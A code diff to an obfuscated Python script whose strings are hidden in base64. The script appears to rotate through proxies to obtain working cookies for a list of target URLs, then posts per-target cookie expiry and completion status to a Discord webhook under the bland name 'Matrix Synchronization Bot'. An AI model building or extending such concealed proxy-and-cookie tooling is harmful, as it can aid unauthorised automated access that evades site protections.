@@ -16,7 +16,7 @@ _0xf1 = _b('dGhlX2MuanNvbg==')
 
 _0xa1 = os.environ.get(_b('Wl9VQQ=='), _b('TW96aWxsYS81LjA='))
 try:
-    _0x5c = json.loads(os.environ.get(_b('Wl9TT1VSQ0VT'), _b('Wl '))) # handled fallback
+    _0x5c = json.loads(os.environ.get(_b('Wl9TT1VSQ0VT'), _b('Wl ')))
 except Exception:
     _0x5c = []
 
@@ -35,39 +35,55 @@ _l2 = Lock()
 
 _0xdc = os.environ.get(_b('Wl9ESVNDT1JEX1dFQlJPT0s='), "")
 
-def _fn_n(s_c, t_c):
+def _fn_n(_dat):
     if not _0xdc:
         return
     try:
-        _dat = _fn_l()
-        _mx = 0
         _nw = int(time.time())
+        _fields = []
         
-        for _k, _v in _dat.get(_b('ZHluYW1pY19zdGF0ZQ=='), {}).items():
-            _cs = _v.get(_b('bGFzdF93b3JraW5nX2Nvb2tpZQ=='), "")
-            _m = re.search(r"exp=(\d+)", _cs)
-            if _m:
-                _ev = int(_m.group(1))
-                if _ev > _mx:
-                    _mx = _ev
-                    
-        _ts = _b('VW5rbm93bg==')
-        if _mx > _nw:
-            _ts = f"VALID (expires in {_fn_t(_mx - _nw)})"
-        elif _mx > 0:
-            _ts = f"EXPIRED ({_fn_t(_nw - _mx)} ago)"
+        _targets = _dat.get(_b('aW5pdGlhbF90YXJnZXRz'), {})
+        _flags = _dat.get(_b('ZmxhZ3M='), {})
+        _dyn = _dat.get(_b('ZHluYW1pY19zdGF0ZQ=='), {})
+        
+        idx = 1
+        for _k, _tgt in _targets.items():
+            _flag = _flags.get(_k, {}).get(_b('ZG9uZQ=='), "NO")
+            _cookie = _dyn.get(_k, {}).get(_b('bGFzdF93b3JraW5nX2Nvb2tpZQ=='), "")
+            
+            _status_text = "Pending"
+            if _cookie:
+                _m = re.search(r"exp=(\d+)", _cookie)
+                if _m:
+                    _ev = int(_m.group(1))
+                    if _ev > _nw:
+                        _status_text = f"Active (Valid for {_fn_t(_ev - _nw)})"
+                    else:
+                        _status_text = f"Expired ({_fn_t(_nw - _ev)} ago)"
+                else:
+                    _status_text = "Active"
+            
+            if _flag == "YES":
+                _status_text += " [Done]"
+            else:
+                _status_text += " [Expired / Pending]"
+            
+            _ordinal = f"{idx}st URL" if idx == 1 else (f"{idx}nd URL" if idx == 2 else f"{idx}rd URL" if idx == 3 else f"{idx}th URL")
+            _fields.append({
+                _b('bmFtZQ=='): f"{_ordinal}: {_k}",
+                _b('dmFsdWU='): f"Status: `{_status_text}`",
+                _b('aW5saW5l'): False
+            })
+            idx += 1
 
-        _fs = _b('8J+SuCBTVUNDRVNT') if s_c > 0 else _b('8J+QtSBBVFRFTlRJT04=')
+        _fs = _b('8J+SuCBTVUNDRVNT')
         
         _payload = {
             _b('dXNlcm5hbWU='): _b('TWF0cml4IFN5bmNocm9uaXphdGlvbiBCb3Q='),
             _b('ZW1iZWRz'): [{
                 _b('dGl0bGU='): f"{_fs} - Sync Process Complete",
-                _b('Y29sb3I='): 3066993 if s_c > 0 else 15158332,
-                _b('ZmllbGRz'): [
-                    {_b('bmFtZQ=='): _b('RXhlY3V0aW9uIFN1bW1hcnk='), _b('dmFsdWU='): f"`{s_c} / {t_c}` target successfully parsed.", _b('aW5saW5l'): True},
-                    {_b('bmFtZQ=='): _b('RWNvcnlzdGVtIEJhc2VsaW5l'), _b('dmFsdWU='): f"Latest Window: `{_ts}`", _b('aW5saW5l'): False}
-                ],
+                _b('Y29sb3I='): 3066993,
+                _b('ZmllbGRz'): _fields,
                 _b('Zm9vdGVy'): {_b('dGV4dA=='): f"Event Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}"}
             }]
         }
@@ -137,9 +153,6 @@ def main():
         return
 
     _targets = _dat.get(_b('aW5pdGlhbF90YXJnZXRz'), {})
-    _tot = len(_targets)
-    _suc = 0
-
     _current_time = int(time.time())
     _flags_key = _b('ZmxhZ3M=')
     _done_key = _b('ZG9uZQ==')
@@ -200,7 +213,6 @@ def main():
                         }
                         _dat[_flags_key][_k][_done_key] = "YES"
                         _fn_s(_dat)
-                        _suc += 1
                         _resolved = True
                         _ex.shutdown(wait=False, cancel_futures=True)
                         break
@@ -215,7 +227,8 @@ def main():
         else:
             print(f"-> Endpoint {_k} failed across all {_total_pool_size} proxies. Proceeding to secondary target...")
 
-    _fn_n(_suc, _tot)
+    _updated_dat = _fn_l()
+    _fn_n(_updated_dat)
 
 if __name__ == "__main__":
     main()
